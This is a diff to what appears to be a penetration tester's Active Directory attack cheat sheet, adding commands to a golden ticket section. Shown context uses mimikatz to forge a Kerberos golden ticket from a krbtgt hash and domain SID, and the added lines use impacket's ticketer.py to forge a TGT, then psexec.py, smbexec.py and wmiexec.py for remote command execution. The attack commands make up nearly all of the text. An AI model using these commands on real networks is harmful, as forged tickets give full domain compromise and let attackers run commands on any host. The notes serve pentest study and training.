@@ -470,6 +470,18 @@ kerberos::purge
 kerberos::golden /user:any_exist_domain_user /domain:corp.com /sid:S-1-5-21-1602875587-2787523311-2599479668(domain SID part,from lsadump::lsa /patch) /krbtgt:75b60230a2394a812000dbfad8415965(from lsadump::lsa /patch) /ptt
 misc::cmd(launch a new command prompt)
 psexec.exe \\dc01 cmd.exe
+
+# To generate the TGT with NTLM
+python ticketer.py -nthash <krbtgt_ntlm_hash> -domain-sid <domain_sid> -domain <domain_name>  <user_name>
+# To generate the TGT with AES key
+python ticketer.py -aesKey <aes_key> -domain-sid <domain_sid> -domain <domain_name>  <user_name>
+# Set the ticket for impacket use
+export KRB5CCNAME=<TGS_ccache_file>
+
+# Execute remote commands with any of the following by using the TGT
+python psexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
+python smbexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
+python wmiexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
 ```
 #### Domain Controller Synchronization
 >If we obtain access to a user account in one of these groups or with these rights assigned, we can perform a dcsync4 attack in which we impersonate a domain controller. This allows us to request any user credentials from the domain.
